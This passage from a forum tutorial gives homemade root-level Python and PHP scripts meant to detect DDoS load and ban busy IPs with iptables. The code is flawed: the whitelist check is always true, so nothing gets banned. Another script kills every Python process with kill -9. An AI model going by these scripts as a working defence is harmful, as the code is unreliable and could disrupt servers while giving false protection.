#007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'netstat&nbsp;-ntu&nbsp;|&nbsp;awk&nbsp;\'{print&nbsp;$5}\'&nbsp;|&nbsp;cut&nbsp;-d:&nbsp;-f1&nbsp;|&nbsp;sort&nbsp;|&nbsp;uniq&nbsp;-c&nbsp;|&nbsp;sort&nbsp;-n&nbsp;&gt;&gt;&nbsp;/root/IPs.txt'</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;apache2&nbsp;stop'</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">file&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/root/IPs.txt'</span><span style="color: #007700">)<br />for&nbsp;</span><span style="color: #0000BB">line&nbsp;in&nbsp;file</span><span style="color: #007700">:<br />&nbsp;&nbsp;</span><span style="color: #0000BB">ip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">line<br />&nbsp;&nbsp;Ban&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;word_num&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;words&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">ip</span><span style="color: #007700">.</span><span style="color: #0000BB">split</span><span style="color: #007700">()<br />&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">text_word&nbsp;in&nbsp;words</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">word_num&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">word_num&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #0000BB">int</span><span style="color: #007700">(</span><span style="color: #0000BB">text_word</span><span style="color: #007700">)&nbsp;&gt;&nbsp;</span><span style="color: #0000BB">20</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Ban&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">word_num&nbsp;is&nbsp;2</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #0000BB">Ban&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'.'&nbsp;</span><span style="color: #0000BB">in&nbsp;text_word</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">skip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #DD0000">'127.0.0.1'&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #DD0000">'176.9.183.142'&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #DD0000">'79.175.163.84'&nbsp;</span><span style="color: #0000BB">in&nbsp;text_word</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">skip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">skip&nbsp;is&nbsp;0</span><span style="color: #007700">:&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'iptables&nbsp;-I&nbsp;INPUT&nbsp;-s&nbsp;%s&nbsp;-j&nbsp;DROP'&nbsp;</span><span style="color: #007700">%</span><span style="color: #0000BB">text_word&nbsp;</span><span style="color: #FF8000">#&nbsp;it&nbsp;use&nbsp;iptables&nbsp;to&nbsp;ban&nbsp;users<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">deny</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'iptables&nbsp;-A&nbsp;INPUT&nbsp;&nbsp;-s&nbsp;%s&nbsp;-j&nbsp;DROP'&nbsp;</span><span style="color: #007700">%</span><span style="color: #0000BB">text_word<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">deny</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;iptables-persistent&nbsp;save'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;iptables-persistent&nbsp;restart'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ipsave&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/root/Banned.txt'</span><span style="color: #007700">,</span><span style="color: #DD0000">'a'</span><span style="color: #007700">)&nbsp;</span><span style="color: #FF8000">#save&nbsp;ip&nbsp;banned&nbsp;for&nbsp;me<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ip_add&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">text_word&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #DD0000">'\n'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ipsave</span><span style="color: #007700">.</span><span style="color: #0000BB">write</span><span style="color: #007700">(</span><span style="color: #0000BB">ip_add</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ipsave</span><span style="color: #007700">.</span><span style="color: #0000BB">close</span><span style="color: #007700">()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br /></span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'rm&nbsp;-rf&nbsp;/root/IPs.txt'</span><span style="color: #007700">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br /></span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;apache2&nbsp;start'</span><span style="color: #007700">)&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>And this file is going to check server [if crashed or not to be open] from inside of your server.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#in.py<br />#!/usr/bin/python<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/in.py<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()&nbsp;&nbsp;</span><span style="color: #FF8000">#start&nbsp;multiprocessing<br /></span><span style="color: #0000BB">Attack&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br /></span><span style="color: #007700">while&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">:<br />&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">0.2</span><span style="color: #007700">)<br />&nbsp;&nbsp;try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Ready_Target&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'z3r0d4y.com'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">connection&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">httplib</span><span style="color: #007700">.</span><span style="color: #0000BB">HTTPConnection</span><span style="color: #007700">(</span><span style="color: #0000BB">Ready_Target</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">connection</span><span style="color: #007700">.</span><span style="color: #0000BB">request</span><span style="color: #007700">(</span><span style="color: #DD0000">"GET"</span><span style="color: #007700">,</span><span style="color: #DD0000">'/'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">response&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">connection</span><span style="color: #007700">.</span><span style="color: #0000BB">getresponse</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E404&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'404'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ENot&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'Not&nbsp;Found'&nbsp;</span><span style="color: #FF8000">#<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">E404&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">response</span><span style="color: #007700">.</span><span style="color: #0000BB">status&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #0000BB">E404&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">response</span><span style="color: #007700">.</span><span style="color: #0000BB">reason&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #0000BB">ENot&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">response</span><span style="color: #007700">.</span><span style="color: #0000BB">status&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #0000BB">ENot&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">response</span><span style="color: #007700">.</span><span style="color: #0000BB">reason</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">'yes'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">0.1</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">'yes'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">0.1</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;except&nbsp;httplib</span><span style="color: #007700">.</span><span style="color: #0000BB">HTTPException</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">e</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attack&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;except&nbsp;ValueError</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attack&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;except&nbsp;socket</span><span style="color: #007700">.</span><span style="color: #0000BB">timeout</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attack&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;except&nbsp;IOError</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attack&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">Attack&nbsp;is&nbsp;10</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'python&nbsp;/root/ban.py'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Attack&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0&nbsp;<br /></span>
</span>
</code></code></div>
</div>This file will check your server status from another host, and you must change check.php file address and upload check.php on other hosting [you can use free hosting], then put url in this script. And notice, you must change ‘z3r0d4y’ word to your site title.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:276px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#out.py<br />#!/usr/bin/python<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/out.py<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()&nbsp;&nbsp;</span><span style="color: #FF8000">#start&nbsp;multiprocessing&nbsp;<br /></span><span style="color: #0000BB">err_c&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br /></span><span style="color: #007700">while&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">:<br />&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">0.5</span><span style="color: #007700">)<br />&nbsp;&nbsp;try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">opnurl&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urllib2</span><span style="color: #007700">.</span><span style="color: #0000BB">urlopen</span><span style="color: #007700">(</span><span style="color: #DD0000">'http://z3r0d4y.com/check.php'</span><span style="color: #007700">).</span><span style="color: #0000BB">read</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #DD0000">'z3r0d4y'&nbsp;</span><span style="color: #0000BB">in&nbsp;opnurl</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;except</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;err_c&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">E&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'python&nbsp;/root/ban.py'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">err_c&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">err_c&nbsp;is&nbsp;100</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">60</span><span style="color: #007700">)&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>And now kill.py for stop process.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:216px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#kill.py<br />#!/usr/bin/python<br />#By&nbsp;Ali&nbsp;Razmjoo<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/kill.py<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()&nbsp;</span><span style="color: #FF8000">#start&nbsp;multiprocessing<br /></span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'ps&nbsp;aux&nbsp;|&nbsp;grep&nbsp;.py&nbsp;&gt;&nbsp;/root/id.txt'</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">f&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/root/id.txt'</span><span style="color: #007700">)<br />for&nbsp;</span><span style="color: #0000BB">line&nbsp;in&nbsp;f</span><span style="color: #007700">:<br />&nbsp;&nbsp;</span><span style="color: #0000BB">line&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">line</span><span style="color: #007700">.</span><span style="color: #0000BB">rsplit</span><span style="color: #007700">()<br />&nbsp;&nbsp;try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">pid&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">int</span><span style="color: #007700">(</span><span style="color: #0000BB">line</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">1</span><span style="color: #007700">&#93;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">cmd&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'kill&nbsp;-9&nbsp;'&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #0000BB">str</span><span style="color: #007700">(</span><span style="color: #0000BB">pid</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">cmd</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">except</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">skip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1&nbsp;<br /></span>
</span>
</code></code></div>
</div>At last check.php file content is simple. Just a file will open my site and you may print the content.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:108px;"><code><code><span style="color: #000000">
#check.php<br /><span style="color: #0000BB">&lt;?php<br />$homepage&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #DD0000">'http://z3r0d4y.com/'</span><span style="color: #007700">);<br />if(</span><span style="color: #0000BB">$homepage</span><span style="color: #007700">){<br />echo&nbsp;</span><span style="color: #0000BB">$homepage<br /></span><span style="color: #007700">}<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div>Setup example:<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:120px;"><code><code><span style="color: #000000">
